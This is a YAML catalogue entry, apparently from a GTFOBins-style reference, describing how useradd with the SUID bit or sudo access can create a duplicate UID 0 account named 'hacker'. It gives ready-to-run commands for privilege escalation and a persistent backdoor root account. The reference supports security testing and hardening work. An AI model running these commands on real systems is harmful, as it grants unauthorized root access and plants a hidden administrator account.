---
functions:
  shell:
    - comment: >
        If the binary has the SUID bit set, it does not drop elevated
        privileges. By creating a new user with UID 0 using `-u 0` (root UID)
        and `-o` (allow non-unique/duplicate UIDs, bypassing the uniqueness
        check since root already holds UID 0), the new account gains full
        root privileges without modifying the existing root account, providing
        both privilege escalation and persistence.
      contexts:
        suid:
          system: false
          code: |
            useradd -o -u 0 hacker -p $(openssl passwd -1 password)
            su hacker
        sudo:
          code: |
            sudo useradd -o -u 0 hacker -p $(openssl passwd -1 password)
            su hacker
...